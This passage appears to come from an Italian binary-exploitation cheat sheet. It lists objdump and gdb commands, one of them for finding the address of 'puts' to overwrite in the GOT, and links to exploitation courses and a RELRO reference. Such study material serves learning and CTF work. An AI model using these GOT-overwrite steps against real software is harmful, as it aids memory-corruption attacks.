- `objdump -t --dynamic-relo ./exec | grep puts` --> Ottiene l'indirizzo di `puts` da sovrascrivere nella GOT
- `objdump -D ./exec` --> Disassembla tutto fino alle voci della PLT
- `objdump -p -/exec`
- `Info functions strncmp` --> Informazioni sulla funzione in gdb

## Corsi interessanti

- [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
- [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Riferimenti**

- [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)
